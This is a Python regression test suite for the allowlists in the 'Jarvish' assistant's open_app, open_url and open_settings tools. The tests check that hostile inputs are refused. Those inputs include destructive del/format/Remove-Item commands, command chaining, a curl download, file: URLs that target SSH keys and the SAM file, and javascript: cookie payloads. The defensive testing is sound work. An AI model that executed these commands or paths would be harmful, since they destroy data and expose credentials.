"""Action-layer tests: the allowlists that stand between the model and the OS.

Jarvish already had `open_app`, `open_url`, `open_settings` and `open_web_app`,
and they worked. What they did not all have was a boundary. `open_app`
resolved an unknown name to the caller's own string and handed it to
`cmd /c start`, where the argument is a command line rather than a filename -
so `open_app("cmd.exe /c del C:\Windows")` executed, through a tool graded
`low` risk that never asks for confirmation. `open_url` accepted any scheme,
including `file:` (local files, including the credential paths the filesystem
guard blocks everywhere else) and `javascript:`.

Nothing here launches anything. The rejection cases return before reaching the
OS, and the acceptance cases are checked by resolving the name through the
allowlist rather than by starting a process, so the suite is safe to run
repeatedly on a real desktop.
"""

import os
import sys

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from jarvish import network, risk, tools, webapps  # noqa: E402

P = F = 0


def ok(label, cond, extra=""):
    global P, F
    if cond:
        P += 1
    else:
        F += 1
    print("  [%s] %-52s %s" % ("PASS" if cond else "FAIL", label, str(extra)[:38]))


def resolves(name):
    """What open_app would launch for this name, or None if it would refuse."""
    key = str(name).strip().lower()
    target = tools.APP_ALIASES.get(key)
    if target is None and key in tools.ALLOWED_APPS:
        target = key
    return target


# ── the allowlist exists and is derived, not duplicated ──────────────────
print("--- the allowlist ---")

ok("APP_ALIASES is the allowlist", len(tools.APP_ALIASES) >= 20, len(tools.APP_ALIASES))
ok("ALLOWED_APPS is derived from it",
   tools.ALLOWED_APPS == frozenset(tools.APP_ALIASES.values()))
ok("only http and https may be opened",
   tuple(tools.ALLOWED_URL_SCHEMES) == ("http", "https"), tools.ALLOWED_URL_SCHEMES)

# ── the six cases a user actually asks for ───────────────────────────────
print("--- the applications a user asks for by name ---")

for spoken, expected in (("chrome", "chrome"), ("google chrome", "chrome"),
                         ("vs code", "code"), ("vscode", "code"),
                         ("notepad", "notepad"), ("calculator", "calc"),
                         ("file explorer", "explorer"), ("edge", "msedge"),
                         ("microsoft edge", "msedge")):
    ok("'" + spoken + "' resolves to " + expected, resolves(spoken) == expected,
       resolves(spoken))

ok("the underlying name works too, not just the alias", resolves("msedge") == "msedge")
ok("case and spacing do not matter", resolves("  VS Code  ") == "code")

# ── unallowed applications are refused ───────────────────────────────────
print("--- an unallowed application is refused ---")

for attempt in ("evilapp", "malware.exe", "C:/Windows/System32/cmd.exe",
                "regedit", "diskpart"):
    result = tools.open_app(attempt)
    ok("refused: " + attempt[:34], result["ok"] is False,
       str(result.get("error", ""))[:34])

ok("the refusal says what is allowed",
   "Allowed:" in str(tools.open_app("evilapp").get("error", "")))
ok("an empty name is refused", tools.open_app("")["ok"] is False)
ok("a whitespace name is refused", tools.open_app("   ")["ok"] is False)

# ── arbitrary command execution is refused ───────────────────────────────
print("--- arbitrary command execution is refused ---")

# Each of these used to reach `cmd /c start`, where everything after the
# executable is arguments. This is the regression that matters most.
for attempt in ("cmd.exe /c del C:\Windows",
                "powershell -c whoami",
                "powershell -Command Remove-Item -Recurse C:\\",
                "notepad && calc",
                "notepad & calc",
                "notepad | calc",
                "cmd /c format C:",
                "curl http://example.com/x.exe -o x.exe"):
    result = tools.open_app(attempt)
    ok("blocked: " + attempt[:40], result["ok"] is False)

ok("even a bare allowed name with arguments is refused",
   tools.open_app("notepad C:/secret.txt")["ok"] is False)
ok("and one with a trailing switch is refused",
   tools.open_app("chrome --headless")["ok"] is False)

# ── url schemes ──────────────────────────────────────────────────────────
print("--- only web addresses may be opened ---")

for attempt in ("file:///C:/Users/testuser/.ssh/id_rsa",
                "file://C:/Windows/System32/config/SAM",
                "javascript:alert(document.cookie)",
                "data:text/html,<script>alert(1)</script>",
                "vbscript:msgbox(1)",
                "ms-settings:network-wifi",
                "ftp://example.com/x"):
    result = tools.open_url(attempt)
    ok("refused: " + attempt[:40], result["ok"] is False,
       str(result.get("error", ""))[:30])

ok("the refusal names the scheme",
   "file:" in str(tools.open_url("file:///x").get("error", "")))

print("--- a malformed address is refused rather than guessed at ---")

for attempt in ("not-a-url", "", "   ", "just some words", "http://"):
    result = tools.open_url(attempt)
    ok("refused: " + repr(attempt)[:36], result["ok"] is False)

# ── settings pages ───────────────────────────────────────────────────────
print("--- settings pages are allowlisted ---")

for attempt in ("; powershell -c whoami", "network-wifi & calc",
                "nonsense", "../../etc/passwd"):
    result = network.open_settings(attempt)
    ok("refused: " + attempt[:36], result["ok"] is False,
       str(result.get("error", ""))[:30])

ok("the refusal lists the real pages",
   "wifi" in str(network.open_settings("nonsense").get("error", "")))

# ── the web app catalogue ────────────────────────────────────────────────
print("--- the web app catalogue ---")

listing = webapps.list_web_apps()
catalogue = str(listing).lower()
for name in ("youtube", "whatsapp", "google", "github"):
    ok("'" + name + "' is in the catalogue", name in catalogue)

result = webapps.open_web_app("definitely not a real app")
ok("an unknown web app is refused", result["ok"] is False,
   str(result.get("error", ""))[:34])
ok("and the refusal suggests open_url",
   "open_url" in str(result.get("error", "")))

# ── risk grading is unchanged ────────────────────────────────────────────
print("--- risk grading unchanged (these stay usable without a prompt) ---")

for name, expected in (("open_url", "low"), ("open_app", "low"),
                       ("open_settings", "low"), ("open_web_app", "low")):
    ok(name + " is graded " + expected, risk.level(name) == expected, risk.level(name))
    ok(name + " runs without confirmation", risk.gated(name, {}) is False)

print("\n%d passed, %d failed" % (P, F))
sys.exit(1 if F else 0)
